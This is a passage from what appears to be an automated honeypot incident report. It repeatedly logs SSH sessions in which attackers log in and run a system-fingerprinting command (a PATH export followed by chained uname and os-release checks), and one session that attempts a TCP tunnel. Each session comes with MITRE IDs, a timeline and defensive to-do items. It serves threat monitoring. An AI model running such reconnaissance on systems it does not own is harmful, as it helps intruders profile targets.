| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:22:04` | `cowrie.session.connect` |
| `2026-08-12 12:22:04` | `cowrie.client.version` |
| `2026-08-12 12:22:04` | `cowrie.client.kex` |
| `2026-08-12 12:22:06` | `cowrie.login.success` |
| `2026-08-12 12:22:07` | `cowrie.session.params` |
| `2026-08-12 12:22:07` | `cowrie.command.input` |
| `2026-08-12 12:22:07` | `cowrie.command.input` |
| `2026-08-12 12:22:07` | `cowrie.command.input` |
| `2026-08-12 12:22:07` | `cowrie.command.input` |
| `2026-08-12 12:22:07` | `cowrie.command.input` |
| `2026-08-12 12:22:07` | `cowrie.command.success` |
| `2026-08-12 12:22:07` | `cowrie.command.input` |
| `2026-08-12 12:22:07` | `cowrie.command.input` |
| `2026-08-12 12:22:07` | `cowrie.command.input` |
| `2026-08-12 12:22:07` | `cowrie.command.input` |
| `2026-08-12 12:22:07` | `cowrie.log.closed` |
| `2026-08-12 12:22:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-173a45c26e10

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:23 |
| **Last Seen** | 2026-08-12 12:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:23:35` | `cowrie.session.connect` |
| `2026-08-12 12:23:35` | `cowrie.client.version` |
| `2026-08-12 12:23:35` | `cowrie.client.kex` |
| `2026-08-12 12:23:37` | `cowrie.login.success` |
| `2026-08-12 12:23:38` | `cowrie.session.params` |
| `2026-08-12 12:23:38` | `cowrie.command.input` |
| `2026-08-12 12:23:38` | `cowrie.command.input` |
| `2026-08-12 12:23:38` | `cowrie.command.input` |
| `2026-08-12 12:23:38` | `cowrie.command.input` |
| `2026-08-12 12:23:38` | `cowrie.command.input` |
| `2026-08-12 12:23:38` | `cowrie.command.success` |
| `2026-08-12 12:23:38` | `cowrie.command.input` |
| `2026-08-12 12:23:38` | `cowrie.command.input` |
| `2026-08-12 12:23:38` | `cowrie.command.input` |
| `2026-08-12 12:23:38` | `cowrie.command.input` |
| `2026-08-12 12:23:39` | `cowrie.log.closed` |
| `2026-08-12 12:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bde65e22b5c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:25 |
| **Last Seen** | 2026-08-12 12:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:25:07` | `cowrie.session.connect` |
| `2026-08-12 12:25:07` | `cowrie.client.version` |
| `2026-08-12 12:25:07` | `cowrie.client.kex` |
| `2026-08-12 12:25:09` | `cowrie.login.success` |
| `2026-08-12 12:25:10` | `cowrie.session.params` |
| `2026-08-12 12:25:10` | `cowrie.command.input` |
| `2026-08-12 12:25:10` | `cowrie.command.input` |
| `2026-08-12 12:25:10` | `cowrie.command.input` |
| `2026-08-12 12:25:10` | `cowrie.command.input` |
| `2026-08-12 12:25:10` | `cowrie.command.input` |
| `2026-08-12 12:25:10` | `cowrie.command.success` |
| `2026-08-12 12:25:10` | `cowrie.command.input` |
| `2026-08-12 12:25:10` | `cowrie.command.input` |
| `2026-08-12 12:25:10` | `cowrie.command.input` |
| `2026-08-12 12:25:10` | `cowrie.command.input` |
| `2026-08-12 12:25:11` | `cowrie.log.closed` |
| `2026-08-12 12:25:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a86db5ca3ac1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:26 |
| **Last Seen** | 2026-08-12 12:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:26:43` | `cowrie.session.connect` |
| `2026-08-12 12:26:43` | `cowrie.client.version` |
| `2026-08-12 12:26:43` | `cowrie.client.kex` |
| `2026-08-12 12:26:44` | `cowrie.login.success` |
| `2026-08-12 12:26:45` | `cowrie.session.params` |
| `2026-08-12 12:26:45` | `cowrie.command.input` |
| `2026-08-12 12:26:45` | `cowrie.command.input` |
| `2026-08-12 12:26:45` | `cowrie.command.input` |
| `2026-08-12 12:26:45` | `cowrie.command.input` |
| `2026-08-12 12:26:45` | `cowrie.command.input` |
| `2026-08-12 12:26:45` | `cowrie.command.success` |
| `2026-08-12 12:26:46` | `cowrie.command.input` |
| `2026-08-12 12:26:46` | `cowrie.command.input` |
| `2026-08-12 12:26:46` | `cowrie.command.input` |
| `2026-08-12 12:26:46` | `cowrie.command.input` |
| `2026-08-12 12:26:46` | `cowrie.log.closed` |
| `2026-08-12 12:26:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1bce4444f53

| Field | Detail |
|---|---|
| **Source IP** | `112.161.26[.]125` |
| **First Seen** | 2026-08-12 12:26 |
| **Last Seen** | 2026-08-12 12:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:26:49` | `cowrie.session.connect` |
| `2026-08-12 12:26:50` | `cowrie.client.version` |
| `2026-08-12 12:26:50` | `cowrie.client.kex` |
| `2026-08-12 12:26:52` | `cowrie.login.success` |
| `2026-08-12 12:26:53` | `cowrie.direct-tcpip.request` |
| `2026-08-12 12:26:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.161.26[.]125` to AbuseIPDB if not already reported
- [ ] Block `112.161.26[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0a4aea1324b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:28 |
| **Last Seen** | 2026-08-12 12:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:28:24` | `cowrie.session.connect` |
| `2026-08-12 12:28:24` | `cowrie.client.version` |
| `2026-08-12 12:28:24` | `cowrie.client.kex` |
| `2026-08-12 12:28:26` | `cowrie.login.success` |
| `2026-08-12 12:28:27` | `cowrie.session.params` |
| `2026-08-12 12:28:27` | `cowrie.command.input` |
| `2026-08-12 12:28:27` | `cowrie.command.input` |
| `2026-08-12 12:28:27` | `cowrie.command.input` |
| `2026-08-12 12:28:27` | `cowrie.command.input` |
| `2026-08-12 12:28:27` | `cowrie.command.input` |
| `2026-08-12 12:28:27` | `cowrie.command.success` |
| `2026-08-12 12:28:27` | `cowrie.command.input` |
| `2026-08-12 12:28:27` | `cowrie.command.input` |
| `2026-08-12 12:28:27` | `cowrie.command.input` |
| `2026-08-12 12:28:27` | `cowrie.command.input` |
| `2026-08-12 12:28:27` | `cowrie.log.closed` |
| `2026-08-12 12:28:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a3d305ac2dd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:29 |
| **Last Seen** | 2026-08-12 12:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:29:57` | `cowrie.session.connect` |
| `2026-08-12 12:29:57` | `cowrie.client.version` |
| `2026-08-12 12:29:57` | `cowrie.client.kex` |
| `2026-08-12 12:29:59` | `cowrie.login.success` |
| `2026-08-12 12:30:00` | `cowrie.session.params` |
| `2026-08-12 12:30:00` | `cowrie.command.input` |
| `2026-08-12 12:30:00` | `cowrie.command.input` |
| `2026-08-12 12:30:00` | `cowrie.command.input` |
| `2026-08-12 12:30:00` | `cowrie.command.input` |
| `2026-08-12 12:30:00` | `cowrie.command.input` |
| `2026-08-12 12:30:00` | `cowrie.command.success` |
| `2026-08-12 12:30:00` | `cowrie.command.input` |
| `2026-08-12 12:30:00` | `cowrie.command.input` |
| `2026-08-12 12:30:00` | `cowrie.command.input` |
| `2026-08-12 12:30:00` | `cowrie.command.input` |
| `2026-08-12 12:30:00` | `cowrie.log.closed` |
| `2026-08-12 12:30:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bea959cf93e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:31 |
| **Last Seen** | 2026-08-12 12:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:31:23` | `cowrie.session.connect` |
| `2026-08-12 12:31:24` | `cowrie.client.version` |
| `2026-08-12 12:31:24` | `cowrie.client.kex` |
| `2026-08-12 12:31:25` | `cowrie.login.success` |
| `2026-08-12 12:31:26` | `cowrie.session.params` |
| `2026-08-12 12:31:26` | `cowrie.command.input` |
| `2026-08-12 12:31:26` | `cowrie.command.input` |
| `2026-08-12 12:31:26` | `cowrie.command.input` |
| `2026-08-12 12:31:26` | `cowrie.command.input` |
| `2026-08-12 12:31:26` | `cowrie.command.input` |
| `2026-08-12 12:31:26` | `cowrie.command.success` |
| `2026-08-12 12:31:26` | `cowrie.command.input` |
| `2026-08-12 12:31:26` | `cowrie.command.input` |
| `2026-08-12 12:31:26` | `cowrie.command.input` |
| `2026-08-12 12:31:26` | `cowrie.command.input` |
| `2026-08-12 12:31:26` | `cowrie.log.closed` |
| `2026-08-12 12:31:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c08e23a1888d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:32 |
| **Last Seen** | 2026-08-12 12:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:32:53` | `cowrie.session.connect` |
| `2026-08-12 12:32:53` | `cowrie.client.version` |
| `2026-08-12 12:32:53` | `cowrie.client.kex` |
| `2026-08-12 12:32:54` | `cowrie.login.success` |
| `2026-08-12 12:32:55` | `cowrie.session.params` |
| `2026-08-12 12:32:55` | `cowrie.command.input` |
| `2026-08-12 12:32:55` | `cowrie.command.input` |
| `2026-08-12 12:32:55` | `cowrie.command.input` |
| `2026-08-12 12:32:55` | `cowrie.command.input` |
| `2026-08-12 12:32:55` | `cowrie.command.input` |
| `2026-08-12 12:32:55` | `cowrie.command.success` |
| `2026-08-12 12:32:55` | `cowrie.command.input` |
| `2026-08-12 12:32:55` | `cowrie.command.input` |
| `2026-08-12 12:32:55` | `cowrie.command.input` |
| `2026-08-12 12:32:55` | `cowrie.command.input` |
| `2026-08-12 12:32:56` | `cowrie.log.closed` |
| `2026-08-12 12:32:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-154963c58e0f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:34 |
| **Last Seen** | 2026-08-12 12:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:34:32` | `cowrie.session.connect` |
| `2026-08-12 12:34:32` | `cowrie.client.version` |
| `2026-08-12 12:34:32` | `cowrie.client.kex` |
| `2026-08-12 12:34:33` | `cowrie.login.success` |
| `2026-08-12 12:34:35` | `cowrie.session.params` |
| `2026-08-12 12:34:35` | `cowrie.command.input` |
| `2026-08-12 12:34:35` | `cowrie.command.input` |
| `2026-08-12 12:34:35` | `cowrie.command.input` |
| `2026-08-12 12:34:35` | `cowrie.command.input` |
| `2026-08-12 12:34:35` | `cowrie.command.input` |
| `2026-08-12 12:34:35` | `cowrie.command.success` |
| `2026-08-12 12:34:35` | `cowrie.command.input` |
| `2026-08-12 12:34:35` | `cowrie.command.input` |
| `2026-08-12 12:34:35` | `cowrie.command.input` |
| `2026-08-12 12:34:35` | `cowrie.command.input` |
| `2026-08-12 12:34:35` | `cowrie.log.closed` |
| `2026-08-12 12:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-712b3afb0741

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:36 |
| **Last Seen** | 2026-08-12 12:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:36:16` | `cowrie.session.connect` |
| `2026-08-12 12:36:16` | `cowrie.client.version` |
| `2026-08-12 12:36:16` | `cowrie.client.kex` |
| `2026-08-12 12:36:18` | `cowrie.login.success` |
| `2026-08-12 12:36:19` | `cowrie.session.params` |
| `2026-08-12 12:36:19` | `cowrie.command.input` |
| `2026-08-12 12:36:19` | `cowrie.command.input` |
| `2026-08-12 12:36:19` | `cowrie.command.input` |
| `2026-08-12 12:36:19` | `cowrie.command.input` |
| `2026-08-12 12:36:19` | `cowrie.command.input` |
| `2026-08-12 12:36:19` | `cowrie.command.success` |
| `2026-08-12 12:36:19` | `cowrie.command.input` |
| `2026-08-12 12:36:19` | `cowrie.command.input` |
| `2026-08-12 12:36:19` | `cowrie.command.input` |
| `2026-08-12 12:36:19` | `cowrie.command.input` |
| `2026-08-12 12:36:19` | `cowrie.log.closed` |
| `2026-08-12 12:36:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f9e16ad8652

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:37 |
| **Last Seen** | 2026-08-12 12:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:37:46` | `cowrie.session.connect` |
| `2026-08-12 12:37:46` | `cowrie.client.version` |
| `2026-08-12 12:37:46` | `cowrie.client.kex` |
| `2026-08-12 12:37:48` | `cowrie.login.success` |
| `2026-08-12 12:37:49` | `cowrie.session.params` |
| `2026-08-12 12:37:49` | `cowrie.command.input` |
| `2026-08-12 12:37:49` | `cowrie.command.input` |
| `2026-08-12 12:37:49` | `cowrie.command.input` |
| `2026-08-12 12:37:49` | `cowrie.command.input` |
| `2026-08-12 12:37:49` | `cowrie.command.input` |
| `2026-08-12 12:37:49` | `cowrie.command.success` |
| `2026-08-12 12:37:49` | `cowrie.command.input` |
| `2026-08-12 12:37:49` | `cowrie.command.input` |
| `2026-08-12 12:37:49` | `cowrie.command.input` |
| `2026-08-12 12:37:49` | `cowrie.command.input` |
| `2026-08-12 12:37:49` | `cowrie.log.closed` |
| `2026-08-12 12:37:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd58f87aa000

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:39 |
| **Last Seen** | 2026-08-12 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:39:14` | `cowrie.session.connect` |
| `2026-08-12 12:39:14` | `cowrie.client.version` |
| `2026-08-12 12:39:14` | `cowrie.client.kex` |
| `2026-08-12 12:39:16` | `cowrie.login.success` |
| `2026-08-12 12:39:17` | `cowrie.session.params` |
| `2026-08-12 12:39:17` | `cowrie.command.input` |
| `2026-08-12 12:39:17` | `cowrie.command.input` |
| `2026-08-12 12:39:17` | `cowrie.command.input` |
| `2026-08-12 12:39:17` | `cowrie.command.input` |
| `2026-08-12 12:39:17` | `cowrie.command.input` |
